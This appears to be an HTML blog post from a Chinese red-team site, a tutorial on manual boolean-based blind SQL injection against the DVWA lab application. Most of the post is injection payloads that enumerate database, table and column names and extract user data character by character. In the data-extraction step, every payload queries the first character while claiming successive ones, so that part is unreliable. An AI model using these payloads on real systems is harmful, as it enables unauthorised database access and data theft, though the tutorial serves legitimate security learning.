@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>MySQL手注之布尔型盲注 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MySQL手注之布尔型盲注</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 18, 2020&nbsp;&nbsp;9:27:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="布尔型盲注简介"><a href="#布尔型盲注简介" class="headerlink" title="布尔型盲注简介"></a>布尔型盲注简介</h2><p>基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回<code>True</code>（页面）和<code>False</code>（页面）。<br>这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p>
+<p>环境：<code>DVWA</code></p>
+<p>注入点：<code>http://www.saul.com/DVWA/vulnerabilities/sqli_blind</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1543.png" alt="图片"></p>
+<p>我们输入数字<code>1</code>提交，页面提示：<code>User ID exists in the database.</code>，说明<code>ID</code>为<code>1</code>的存在与数据库中！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1544.png" alt="图片"></p>
+<p>我们输入数字<code>10</code>提交，页面显示：<code>User ID is MISSING from the database</code>，说明<code>ID</code>为<code>10不在</code>数据库中！</p>
+<h3 id="MySQL盲注常用函数"><a href="#MySQL盲注常用函数" class="headerlink" title="MySQL盲注常用函数"></a>MySQL盲注常用函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length() 返回字符串的长度，例如可以返回数据库名字的长度 </span><br><span class="line">substr() ⽤来截取字符串 </span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line">sleep(n) 将程序挂起⼀段时间，n为n秒</span><br><span class="line">if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h2><h3 id="1、判断是否存在注入，是字符型还是数字型注入"><a href="#1、判断是否存在注入，是字符型还是数字型注入" class="headerlink" title="1、判断是否存在注入，是字符型还是数字型注入"></a>1、判断是否存在注入，是字符型还是数字型注入</h3><p>注入点原查询代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; </span><br></pre></td></tr></table></figure>
+
+<p>判断注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">带入查询的语句：</span><br><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=1 #&#x27;;&quot;; </span><br><span class="line">注入语句： </span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">带入查询的语句：</span><br><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=2 #&#x27;;&quot;; </span><br></pre></td></tr></table></figure>
+
+<p><code>1&#39; and 1=1 #</code> 返回正常：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1545.png" alt="图片"></p>
+<p><code>1&#39; and 1=2 #</code> 返回错误：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1546.png" alt="图片"></p>
+<p>说明存在注入，而且是字符型的注入！（如果是数字型的注入，那么就不用去闭合单引号）</p>
+<h3 id="2、猜解当前数据库名"><a href="#2、猜解当前数据库名" class="headerlink" title="2、猜解当前数据库名"></a>2、猜解当前数据库名</h3><p>猜数据库名长度： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1 #</span><br><span class="line">1&#x27; and length(database())=2 #</span><br><span class="line">1&#x27; and length(database())=3 # </span><br><span class="line">1&#x27; and length(database())=4 #</span><br></pre></td></tr></table></figure>
+
+<p><code>1&#39; and length(database())=3 #</code>  ，页面返回错误：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1547.png" alt="图片"></p>
+<p><code>1&#39; and length(database())=4 #</code>，页面返回正常：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1548.png" alt="图片"></p>
+<p>说明当前数据库名长度为<code>4</code>！</p>
+<p>⼆分法逐字猜解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;122 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值）</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;103 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=100 #，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。 </span><br><span class="line">重复以上步骤直到得出完整的数据库名dvwa</span><br><span class="line">1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">猜解数据库第一个字符为：d</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=100 #</span><br><span class="line">猜解数据库第二个字符为：v</span><br><span class="line">1&#x27; and ascii(substr(database(),2,1))=118 #</span><br><span class="line">猜解数据库第三个字符为：w</span><br><span class="line">1&#x27; and ascii(substr(database(),3,1))=119 #</span><br><span class="line">猜解数据库第三个字符为：a</span><br><span class="line">1&#x27; and ascii(substr(database(),4,1))=97 #</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">substr（str,start,stop）</span><br><span class="line">substr截取字符串str,从start开始截取，截取stop个字符</span><br></pre></td></tr></table></figure>
+
+<p>这里我就不一一截图了，我就截图第四个字符串的图：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1549.png" alt="图片"></p>
+<p>这样我们就得到了当前数据库名为：<code>dvwa</code></p>
+<h3 id="3、猜解表名"><a href="#3、猜解表名" class="headerlink" title="3、猜解表名"></a>3、猜解表名</h3><p>猜解表的数量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显⽰不存在</span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显⽰存在</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">原理是使用count()这个函数来判断table_name这个表的数量有几个</span><br><span class="line">然后后面有一个where判断来指定是当前数据库</span><br><span class="line">在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1550.png" alt="图片"></p>
+<p>由上图可知，我们判断出当前数据库名下的表有两个！</p>
+<p>猜解表名长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显⽰存在</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1),1) 这条语句就是substr的str,要截取的字符</span><br><span class="line">limit 0,1 这条语句是 limit 子句来限制查询的数量，具体格式是这样的：</span><br><span class="line">select * from tableName limit i,n</span><br><span class="line">tableName：表名</span><br><span class="line">i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span><br><span class="line">n：为查询结果返回的数量</span><br><span class="line">i与n之间使用英文逗号&quot;,&quot;隔开</span><br><span class="line">limit n 等同于 limit 0,n</span><br><span class="line">limit 0,1 默认0（i）就是从1开始</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1551.png" alt="图片"></p>
+<p>由上图可见，我们查询出来第一个表名的长度是<code>9</code>，那么如果想查询第二个表名的长度就用这条语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # 显⽰存在</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1552.png" alt="图片"></p>
+<p>由上图可见第二个表名的长度为5，想要继续查下面的表就可以在 <code>limit x,n</code> ，<code>x</code>这个参数继续增加<code>1</code>，这样以此类推就可以查询多个表名的长度！</p>
+<p>猜解表的名字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个表名的第一个字符长度是否为：g</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 返回正常</span><br><span class="line">猜解第一个表名的第二个字符长度是否为：u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 # 返回正常</span><br><span class="line">猜解第一个表名的第三个字符长度是否为：e</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101 # 返回正常</span><br><span class="line">猜解第一个表名的第四个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=115 # 返回正常</span><br><span class="line">猜解第一个表名的第五个字符长度是否为：t</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=116 # 返回正常</span><br><span class="line">猜解第一个表名的第六个字符长度是否为：b</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=98 # 返回正常</span><br><span class="line">猜解第一个表名的第七个字符长度是否为：o</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1))=111 # 返回正常</span><br><span class="line">猜解第一个表名的第八个字符长度是否为：o</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),8,1))=111 # 返回正常</span><br><span class="line">猜解第一个表名的第九个字符长度是否为：k</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1))=107 # 返回正常</span><br><span class="line"></span><br><span class="line">语法格式是：</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))&gt;97 #</span><br><span class="line">i 是第几个表</span><br><span class="line">n 是第几个字符长度</span><br></pre></td></tr></table></figure>
+
+<p>这里我就不全部一一截图了，我就截图<code>第九</code>个字符长度为<code>k</code>的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1553.png" alt="图片"></p>
+<p>这样就查询出来第一个表名为：<code>guestbook</code></p>
+<p>那么想要查询下一个表名就可以使用这个语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个表名的第一个字符长度是否为：u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117 # 返回正常</span><br><span class="line">猜解第二个表名的第二个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115 # 返回正常</span><br><span class="line">猜解第二个表名的第三个字符长度是否为：e</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),3,1))=101 # 返回正常</span><br><span class="line">猜解第二个表名的第四个字符长度是否为：r</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114 # 返回正常</span><br><span class="line">猜解第二个表名的第五个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),5,1))=115 # 返回正常</span><br></pre></td></tr></table></figure>
+
+<p>这里我就不一一截图了，我就截图<code>第五</code>个字符的长度为<code>s</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1554.png" alt="图片"></p>
+<p>这样我们就猜解出来了<code>第二</code>个表名为：<code>users</code></p>
+<h3 id="4、猜解表中的字段名"><a href="#4、猜解表中的字段名" class="headerlink" title="4、猜解表中的字段名"></a>4、猜解表中的字段名</h3><p>猜解字段的数量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断表名users的字段数量是否为8</span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=8 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1555.png" alt="图片"></p>
+<p>由上图可知，字段有<code>8</code>个！</p>
+<p>我们上帝视角看看：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1556.png" alt="图片"></p>
+<p>猜解第⼀个字段的长度（user_id）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字段的长度是否为7：</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1))=7 # </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1557.png" alt="图片"></p>
+<p>猜解第二个字段的长度（first_name）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字段的长度是否为10：</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1))=10 # </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1558.png" alt="图片"></p>
+<p>如果查询下一个字段就以此类推！</p>
+<p>猜解第⼀个字段名（user_id）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字段名的第一个字符为：u</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1,1))=117 #</span><br><span class="line">猜解第一个字段名的第二个字符为：s</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),2,1))=115 #</span><br><span class="line">猜解第一个字段名的第三个字符为：e</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),3,1))=101 #</span><br><span class="line">猜解第一个字段名的第四个字符为：r</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),4,1))=114 #</span><br><span class="line">猜解第一个字段名的第五个字符为：_</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),5,1))=95 #</span><br><span class="line">猜解第一个字段名的第六个字符为：i</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),6,1))=105 #</span><br><span class="line">猜解第一个字段名的第七个字符为：d</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),7,1))=100 #</span><br></pre></td></tr></table></figure>
+
+<p>这里我就不一一截图了，我就只截图<code>最后一个</code>字符为<code>d</code>的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1559.png" alt="图片"></p>
+<p>猜解第二个字段名（first_name）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字段名的第一个字符为：f</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1,1))=102 #</span><br><span class="line">猜解第二个字段名的第二个字符为：i</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),2,1))=105 #</span><br><span class="line">猜解第二个字段名的第三个字符为：r</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),3,1))=114 #</span><br><span class="line">猜解第二个字段名的第四个字符为：s</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),4,1))=115 #</span><br><span class="line">猜解第二个字段名的第五个字符为：t</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),5,1))=116 #</span><br><span class="line">猜解第二个字段名的第六个字符为：_</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),6,1))=95 #</span><br><span class="line">猜解第二个字段名的第七个字符为：n</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),7,1))=110 #</span><br><span class="line">猜解第二个字段名的第八个字符为：a</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),8,1))=97 #</span><br><span class="line">猜解第二个字段名的第九个字符为：m</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),9,1))=109 #</span><br><span class="line">猜解第二个字段名的第十个字符为：e</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),10,1))=101 #</span><br></pre></td></tr></table></figure>
+
+<p>这里我就不一一截图了，我只截图<code>最后一个</code>字符<code>e</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1560.png" alt="图片"></p>
+<p>如果想查询第<code>n</code>个字段名，那么就使用这个语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit i,1),n,1))=101 #</span><br><span class="line">注释：</span><br><span class="line">i代表查询第几个字段名</span><br><span class="line">n代码查询字段名的第几个字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、猜解数据"><a href="#5、猜解数据" class="headerlink" title="5、猜解数据"></a>5、猜解数据</h3><p>根据<code>ascii</code>码来猜解数据：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1561.png" alt="图片"></p>
+<p>上帝视角如上图，我们就查询 <code>user</code> 这个字段的数据吧！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解 dvwa.users 表下的 user 列的第一个字段内容为：a</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第二个字段内容为：d</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=100 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第三个字段内容为：m</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=109 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第四个字段内容为：i</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=105 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第五个字段内容为：n</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=110 # </span><br></pre></td></tr></table></figure>
+
+<p>这里我就不一一截图了，我就截图<code>最后一个</code>字符<code>n</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1562.png" alt="图片"></p>
+<p>这样就猜解出来字段内容为 <code>admin</code>！想要查询下一个就以此类推！</p>
+<p>暴力猜解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解 user 字段值是否为 admin</span><br><span class="line">1&#x27; and (select count(*) from users where user = &#x27;admin&#x27;) = 1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1563.png" alt="图片"></p>
+<p>返回正常说明有 <code>admin</code>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解 user 字段值是否为 1337</span><br><span class="line">1&#x27; and (select count(*) from users where user = &#x27;1337&#x27;) = 1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1564.png" alt="图片"></p>
+<p>返回正常说明有 <code>1337</code>！这样就能够通过暴力破解(字典)的形式来猜解字段内容！以此类推下去猜解全部的字段内容！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
